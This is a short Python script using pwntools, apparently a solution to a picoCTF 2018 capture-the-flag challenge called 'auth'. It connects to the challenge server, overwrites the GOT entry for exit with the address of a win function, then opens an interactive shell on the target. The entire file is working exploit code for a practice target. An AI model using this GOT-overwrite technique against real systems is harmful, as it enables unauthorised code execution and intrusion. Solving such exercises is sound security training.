#! /usr/bin/env python
#
from pwn import context, remote, log, ELF, sleep
context.clear(arch='i386', os='linux')


class ExploitInfo:
    host = '2018shell2.picoctf.com'
    port = 27952
    name = 'auth'
    elf = ELF(name)
    #

def main():
    p = remote(ExploitInfo.host, ExploitInfo.port)

    exit_got = ExploitInfo.elf.got['exit']
    win_addr = ExploitInfo.elf.sym['win']
    log.info('GOT  exit : 0x%x', exit_got)
    log.info('ADDR win  : 0x%x', win_addr)

    p.clean()
    p.sendline(hex(exit_got))

    sleep(1)

    p.sendline(hex(win_addr))

    p.clean()
    log.success("Rejoice me!")
    p.sendline('ls -l')
    p.interactive()


if __name__ == "__main__":
    main()
